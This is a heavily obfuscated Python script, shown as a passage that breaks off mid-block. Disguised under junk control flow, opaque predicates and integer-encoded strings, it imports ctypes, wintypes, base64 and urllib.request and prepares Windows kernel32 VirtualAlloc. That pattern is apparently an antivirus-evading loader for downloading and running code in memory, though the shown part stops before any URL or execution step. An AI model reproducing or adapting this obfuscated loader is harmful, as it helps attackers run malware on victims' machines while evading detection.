__5979875044176 = 0
__5979875044176 += 1
try:
    raise MemoryError(__5979875044176)
except MemoryError as __7054409650989:
    if __7054409650989.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(73) > int(411) < int(178) > int(317))) and bool(str(str(210) > int(41) < int(1019) > int(1113))) > 2 else bool
    if __7054409650989.args[0] == 3:
        __4718260911479 = 94720095992124
    if __7054409650989.args[0] == 4:
        __5242235788301 = 243746137605372
    if __7054409650989.args[0] == 5:
        __6327797901441 = 225086099825628
    if __7054409650989.args[0] == 6:
        __5727065352337 = 257683446207439
__7295135588574 = 0
__7295135588574 += 1
try:
    raise MemoryError(__7295135588574)
except MemoryError as __3477955156694:
    if __3477955156694.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(117) > int(812) < int(126) > int(122))) and bool(str(str(916) > int(157) < int(1417) > int(415))) > 2 else str
    if __3477955156694.args[0] == 3:
        __4232970471978 = 163478310181388
__7106138305016 = 0
__7106138305016 += 1
try:
    raise MemoryError(__7106138305016)
except MemoryError as __6237186529707:
    if __6237186529707.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(813) > int(513) < int(119) > int(315))) and bool(str(str(54) > int(84) < int(610) > int(1813))) > 2 else type
    if __6237186529707.args[0] == 3:
        __4233856820203 = 243060319439737
__3390595332722 = 0
__3390595332722 += 1
try:
    raise MemoryError(__3390595332722)
except MemoryError as __8496086282593:
    if __8496086282593.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(165) > int(184) < int(1410) > int(171))) and bool(str(str(163) > int(162) < int(1519) > int(113))) > 2 else int
    if __8496086282593.args[0] == 3:
        __6532015102309 = 194349722481753
    if __8496086282593.args[0] == 4:
        __3925832335191 = 73113360106547
    if __8496086282593.args[0] == 5:
        __8153363194827 = 29897922640442
__8245049434947 = 0
__8245049434947 += 1
try:
    raise MemoryError(__8245049434947)
except MemoryError as __3456510641291:
    if __3456510641291.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(1214) > int(17) < int(817) > int(1613))) and bool(str(str(1711) > int(1512) < int(196) > int(912))) > 2 else bytes
    if __3456510641291.args[0] == 3:
        __6884202158478 = 5897763628439
__6194369848140 = 0
__6194369848140 += 1
try:
    raise MemoryError(__6194369848140)
except MemoryError as __5058412051917:
    if __5058412051917.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(35) > int(18) < int(613) > int(1812))) and bool(str(str(1516) > int(16) < int(1819) > int(15))) > 2 else vars
    if __5058412051917.args[0] == 3:
        __2083598217366 = 202366804215574
    if __5058412051917.args[0] == 4:
        __4666398206650 = 199085568778305
    if __5058412051917.args[0] == 5:
        __6549889297443 = 220155288182760
    if __5058412051917.args[0] == 6:
        __5022448703863 = 65517289356718
__4005433833330 = 0
__4005433833330 += 1
try:
    raise MemoryError(__4005433833330)
except MemoryError as __4042734125411:
    if __4042734125411.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(412) > int(133) < int(416) > int(174))) and bool(str(str(123) > int(711) < int(91) > int(616))) > 2 else callable
    if __4042734125411.args[0] == 3:
        __8592807735303 = 220113052771404
    if __4042734125411.args[0] == 4:
        __2450476130510 = 28238707941277
__4941669596145 = 0
__4941669596145 += 1
try:
    raise MemoryError(__4941669596145)
except MemoryError as __6606761048072:
    if __6606761048072.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(1713) > int(312) < int(76) > int(62))) and bool(str(str(59) > int(419) < int(61) > int(43))) > 2 else eval
    if __6606761048072.args[0] == 3:
        __3610515099292 = 55649459733086
__4681409450053 = 0
__4681409450053 += 1
try:
    raise MemoryError(__4681409450053)
except MemoryError as __6075590384629:
    if __6075590384629.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(35) > int(31) < int(192) > int(1516))) and bool(str(str(78) > int(123) < int(819) > int(1413))) > 2 else list
    if __6075590384629.args[0] == 3:
        __7684743535393 = 235889877312395
    if __6075590384629.args[0] == 4:
        __4089958556517 = 102189879616609
    if __6075590384629.args[0] == 5:
        __4451854312869 = 20412543549984
    if __6075590384629.args[0] == 6:
        __7200011318373 = 126087147802472
__5647022378690 = 0
__5647022378690 += 1
try:
    raise MemoryError(__5647022378690)
except MemoryError as __3891431341184:
    if __3891431341184.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(35) > int(134) < int(314) > int(1016))) and bool(str(str(17) > int(121) < int(165) > int(89))) > 2 else map
    if __3891431341184.args[0] == 3:
        __8044552202578 = 194357545666541
__4099406181957 = 0
__4099406181957 += 1
try:
    raise MemoryError(__4099406181957)
except MemoryError as __3775837660247:
    if __3775837660247.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(711) > int(134) < int(123) > int(1917))) and bool(str(str(1410) > int(1310) < int(197) > int(111))) > 2 else __import__
    if __3775837660247.args[0] == 3:
        __5661076596518 = 169598788319293
    if __3775837660247.args[0] == 4:
        __5540713205344 = 247032989411328
    if __3775837660247.args[0] == 5:
        __7308518162715 = 159913860460966
    if __3775837660247.args[0] == 6:
        __6836696125907 = 269609430702009
    if __3775837660247.args[0] == 7:
        __3581263696537 = 183538103709268
__2279562564052 = 0
__2279562564052 += 1
try:
    raise MemoryError(__2279562564052)
except MemoryError as __4717418301498:
    if __4717418301498.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(89) > int(137) < int(517) > int(1418))) and bool(str(str(96) > int(410) < int(1119) > int(14))) > 2 else print
    if __4717418301498.args[0] == 3:
        __6754088930683 = 203294378614110
    if __4717418301498.args[0] == 4:
        __6378071377959 = 80941346407592
    if __4717418301498.args[0] == 5:
        __5776159416211 = 130324637376971
    if __4717418301498.args[0] == 6:
        __5898347897598 = 154409392553980
    if __4717418301498.args[0] == 7:
        __3130965803079 = 62410259138124
__5478885995463 = 0
__5478885995463 += 1
try:
    raise MemoryError(__5478885995463)
except MemoryError as __7173199390717:
    if __7173199390717.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(134) > int(715) < int(118) > int(149))) and bool(str(str(511) > int(915) < int(1815) > int(610))) > 2 else input
    if __7173199390717.args[0] == 3:
        __6283299046973 = 164249697113673
    if __7173199390717.args[0] == 4:
        __5200506671112 = 36789794530698
    if __7173199390717.args[0] == 5:
        __2882555586505 = 124815536227998
    if __7173199390717.args[0] == 6:
        __4511272785406 = 279953471936005
    if __7173199390717.args[0] == 7:
        __3130947636157 = 239704233746395

def R_E_D__A_V____(RED_DEFENDER, *k):
    __5186819891566 = 0
    __5186819891566 += 1
    try:
        raise MemoryError(__5186819891566)
    except MemoryError as __6411596349293:
        if __6411596349293.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __6411596349293.args[0] == 1:
            globals()['_121'] = (lambda : (lambda _714: _714 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6411596349293.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __6411596349293.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __6411596349293.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __6411596349293.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _121:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _51: _51 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __6411596349293.args[0] == 1:
            return R_E_D____A_V
        if __6411596349293.args[0] == 9:
            __7170981385474 = 177611753655152

def ______R_E_D__A_V_______(x):
    __2251769926884 = 0
    __2251769926884 += 1
    try:
        raise MemoryError(__2251769926884)
    except MemoryError as __7599085973411:
        if __7599085973411.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __7599085973411.args[0] == 3:
            __5280676177192 = 238136170204621

def R_E_D__A_V(e):
    __8603691210476 = 0
    __8603691210476 += 1
    try:
        raise MemoryError(__8603691210476)
    except MemoryError as __5697616160311:
        if __5697616160311.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __5697616160311.args[0] == 1:
            r = 0
        if __5697616160311.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __5697616160311.args[0] == 1:
            return r
        if __5697616160311.args[0] == 6:
            __8221637666129 = 187628124739566
        if __5697616160311.args[0] == 7:
            __4899468188949 = 104738778883331
        if __5697616160311.args[0] == 8:
            __6651501540430 = 123921989814149
        if __5697616160311.args[0] == 9:
            __8501038219527 = 50454015419170
        if __5697616160311.args[0] == 10:
            __5552382126969 = 113756247531914

def ____________________________(x):
    __2627986697037 = 0
    __2627986697037 += 1
    try:
        raise MemoryError(__2627986697037)
    except MemoryError as __4769726165933:
        if __4769726165933.args[0] == 1:
            ar = []
        if __4769726165933.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __4769726165933.args[0] == 1:
            return ar
        if __4769726165933.args[0] == 5:
            __4732728998550 = 259710269829505
        if __4769726165933.args[0] == 6:
            __3944709140585 = 238341202156852
if (lambda : (lambda _812: _812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '1013' == '1813':
        case True:
            raise MemoryError([True])
        case False:
            _1112 = [[True], [False]]
            R_E_D__A_V______(['_129'])
    raise MemoryError([True])
except MemoryError as _1817:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _95: _95 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _96 = [[(lambda : (lambda _314: _314 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1312: _1312 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1416: _1416 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _161:
        import sys
try:
    match '1712' == '144':
        case True:
            raise MemoryError([True])
        case False:
            _111 = [[True], [False]]
            R_E_D__A_V______(['_114'])
    raise MemoryError([True])
except MemoryError as _1516:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _133: _133 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1219 = [[(lambda : (lambda _1814: _1814 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _106: _106 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _115: _115 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _716:
        import ctypes
try:
    match '177' == '38':
        case True:
            raise MemoryError([True])
        case False:
            _417 = [[True], [False]]
            R_E_D__A_V______(['_46'])
    raise MemoryError([True])
except MemoryError as _1410:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1713: _1713 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _176 = [[(lambda : (lambda _1118: _1118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _13: _13 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _69: _69 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1213:
        import base64
try:
    match '114' == '713':
        case True:
            raise MemoryError([True])
        case False:
            _1114 = [[True], [False]]
            R_E_D__A_V______(['_1511'])
    raise MemoryError([True])
except MemoryError as _912:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _518: _518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _109 = [[(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _613: _613 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _172: _172 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1617:
        import ctypes.wintypes as wt
try:
    match '1411' == '193':
        case True:
            raise MemoryError([True])
        case False:
            _1413 = [[True], [False]]
            R_E_D__A_V______(['_79'])
    raise MemoryError([True])
except MemoryError as _52:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _159: _159 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _716 = [[(lambda : (lambda _1310: _1310 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _131: _131 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _215: _215 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _76:
        import urllib.request
try:
    match '101' == '115':
        case True:
            raise MemoryError([True])
        case False:
            _75 = [[True], [False]]
            R_E_D__A_V______(['_810'])
    raise MemoryError([True])
except MemoryError as _816:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _114: _114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _513 = [[(lambda : (lambda _131: _131 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _74: _74 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _154: _154 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1418:
        __3386539820072 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1118' == '1614':
        case True:
            raise MemoryError([True])
        case False:
            _49 = [[True], [False]]
            R_E_D__A_V______(['_1417'])
    raise MemoryError([True])
except MemoryError as _138:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _716: _716 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _119 = [[(lambda : (lambda _1213: _1213 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _818: _818 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _912: _912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _16:
        __3386539820072 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '119' == '1514':
        case True:
            raise MemoryError([True])
        case False:
            _72 = [[True], [False]]
            R_E_D__A_V______(['_1513'])
    raise MemoryError([True])
except MemoryError as _613:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1415: _1415 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _172 = [[(lambda : (lambda _151: _151 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _81: _81 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1417: _1417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _86:
        try:
            raise MemoryError(__3386539820072)
        except MemoryError as __4304776015057:
            if __4304776015057.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __4304776015057.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7080330952331 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x164\xa0qw\xb4'))()
try:
    match '1016' == '1416':
        case True:
            raise MemoryError([True])
        case False:
            _418 = [[True], [False]]
            R_E_D__A_V______(['_147'])
    raise MemoryError([True])
except MemoryError as _35:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _121: _121 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1814 = [[(lambda : (lambda _711: _711 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1015: _1015 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1211: _1211 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1219:
        __2127720579131 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1013' == '1017':
        case True:
            raise MemoryError([True])
        case False:
            _1318 = [[True], [False]]
            R_E_D__A_V______(['_157'])
    raise MemoryError([True])
except MemoryError as _115:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _163 = [[(lambda : (lambda _189: _189 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _124: _124 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _68: _68 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _158:
        __2127720579131 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '84' == '1219':
        case True:
            raise MemoryError([True])
        case False:
            _1912 = [[True], [False]]
            R_E_D__A_V______(['_97'])
    raise MemoryError([True])
except MemoryError as _616:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _161: _161 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _613 = [[(lambda : (lambda _912: _912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _86: _86 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _166: _166 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _318:
        try:
            raise MemoryError(__2127720579131)
        except MemoryError as __4453617461524:
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7224995375040 = (lambda : R_E_D__A_V(b'R_E_D__A_V__%l\x15\x1f\x1a\xcd'))()
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4245229940013 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x17N\x068\x9e\xa1'))()
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __5450497829997 = (lambda : R_E_D__A_V(b'R_E_D__A_V__V\xba\x83O\x81\x13'))()
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2928594592695 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x119P\x87@:'))()
            if __4453617461524.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __6317012599143 = (lambda : R_E_D__A_V(b'R_E_D__A_V__(\xb5\x18\xd8\xe0\xfe'))()
try:
    match '1610' == '813':
        case True:
            raise MemoryError([True])
        case False:
            _182 = [[True], [False]]
            R_E_D__A_V______(['_1217'])
    raise MemoryError([True])
except MemoryError as _819:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _138: _138 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _146 = [[(lambda : (lambda _711: _711 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _814: _814 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _52: _52 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1815:
        __4077463145705 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1913' == '49':
        case True:
            raise MemoryError([True])
        case False:
            _517 = [[True], [False]]
            R_E_D__A_V______(['_156'])
    raise MemoryError([True])
except MemoryError as _510:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _106: _106 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _185 = [[(lambda : (lambda _108: _108 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _810: _810 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1610: _1610 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _132:
